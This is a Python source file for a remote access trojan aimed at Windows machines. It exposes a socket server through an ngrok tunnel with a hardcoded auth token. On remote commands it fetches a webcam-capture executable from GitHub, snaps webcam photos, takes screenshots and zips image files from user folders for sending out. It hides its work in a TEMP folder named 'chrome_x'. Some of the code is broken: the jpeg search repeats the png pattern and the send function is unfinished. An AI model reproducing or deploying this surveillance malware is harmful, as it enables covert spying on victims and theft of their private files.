import threading, socket, os, base64, zipfile, tqdm

from pyngrok import ngrok
import urllib.request as url
from glob import glob


HEADER = 64
PORT = 1342
SERVER = "127.0.0.1"
ADDR = ((SERVER, PORT))
FORMAT = 'utf-8'



server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind(ADDR)

ngrok.set_auth_token("1TTs2Ec4ruLSmV03YOQ3u8XQF4b_4CvjWi6ouTFxJj3YWAS3W")

try:
    tunnel = ngrok.connect(PORT, "tcp")
except:
    print('Failed')
    quit()


def handle_client(conn, addr):
    print(f"[NEW CONNECTION] {addr}")
    
    connected = True
    while connected:
        msg = conn.recv(1026).decode(FORMAT)
        if msg.startswith('s'):
            if msg == 'sWCP':
                conn.send(cameraAction('snap'))

            elif msg == 'sSS':
                conn.send(screenAction('sSS'))
            elif msg == 'sGP':
                conn.send(fileAction('gAP'))

        elif msg == 'exit':
            connected = False
    conn.close()



def start():
    print('[ACCEPTING CONNECTIONS]')
    print(f'Listening on {tunnel.public_url}')
    server.listen()
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()


def cameraAction(action):
    os.chdir(os.getenv("TEMP"))
    try:
        os.mkdir('chrome_x')
    except:
        pass
    os.chdir("chrome_x")
    url.urlretrieve("https://github.com/Stormwolfplayz/R.A.T/raw/main/Apps/CommandCam.exe", "CommandCam.exe")
    
    if action == 'snap':
        os.system("CommandCam")
        with open("image.bmp", "rb") as image:
            b64string = base64.b64encode(image.read())
        os.chdir("../")
        os.system("DEL /f /q /s chrome_x")
        os.rmdir("chrome_x")
    return b64string

def screenAction(action):
    import mss
    if action.startswith('s'):
        if action[1:] == 'SS':
                os.chdir(os.getenv("TEMP"))
                with mss.mss() as sct:
                    sct.shot(output = os.path.join(os.getenv("TEMP") + "\\image.png"))
                with open("image.png", "rb") as image:
                    b64string = base64.b64encode(image.read())
                os.system("DEL image.png")
                return b64string

def fileAction(action):
    path = 'C:/Users/'
    if action == 'gAP':

        os.chdir(os.getenv("TEMP"))
        try:
            os.mkdir('chrome_x')
        except:
            pass
        os.chdir("chrome_x")
        
        print('Collecting Png Files...')
        pngs = glob(path + "/**/*.png", recursive = True)
        print('Collecting Jpeg Files...')
        jpgs = glob(path + "/**/*.png", recursive = True)

        files = pngs+jpgs

        with zipfile.ZipFile("picture.zip", 'w') as zip:
            for file in files:
                try:
                    print(file)
                    zip.write(file)
                except:
                    print("Error")
        sendFile('picture.zip')

def sendFile(fileName):
    size = os.path.getsize(fileName)
    

start()